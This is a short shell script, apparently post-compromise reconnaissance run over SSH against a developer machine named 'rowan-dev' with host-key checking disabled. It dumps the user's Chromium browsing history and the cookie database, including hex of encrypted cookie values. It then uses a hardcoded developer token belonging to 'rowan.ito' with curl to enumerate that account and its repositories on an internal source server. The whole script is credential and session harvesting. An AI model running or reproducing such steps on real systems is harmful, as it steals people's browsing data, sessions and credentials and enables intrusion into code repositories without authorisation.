set +e
S="ssh -o BatchMode=yes -o StrictHostKeyChecking=no rowan-dev"
run(){ echo "===== $1 ====="; $S "$1" 2>&1; echo; }
CA=/home/rowan/.local/share/keplerops/ca.crt
CRED='rowan.ito:fk_developer_yUWTKSqrc16y3K5_5DfQ7qacft9b-9xo'
run "which sqlite3 jq git curl python3; echo ---; strings .config/chromium/Default/History | grep -iE 'arwc|ticket|support|http' | head -40"
run "sqlite3 .config/chromium/Default/History '.tables' 2>&1; echo ---; sqlite3 .config/chromium/Default/History 'select datetime(last_visit_time/1000000-11644473600,\"unixepoch\"),title,url from urls order by last_visit_time desc limit 40;' 2>&1"
run "sqlite3 .config/chromium/Default/Cookies '.tables' 2>&1; echo ---; sqlite3 .config/chromium/Default/Cookies 'select host_key,name,length(encrypted_value),hex(encrypted_value),path,expires_utc from cookies;' 2>&1 | head -40"
run "curl -sS -m 10 --cacert $CA -u '$CRED' 'https://source.keplerops.test/api/v1/user' ; echo; echo ---REPOS---; curl -sS -m 10 --cacert $CA -u '$CRED' 'https://source.keplerops.test/api/v1/user/repos?limit=50'"
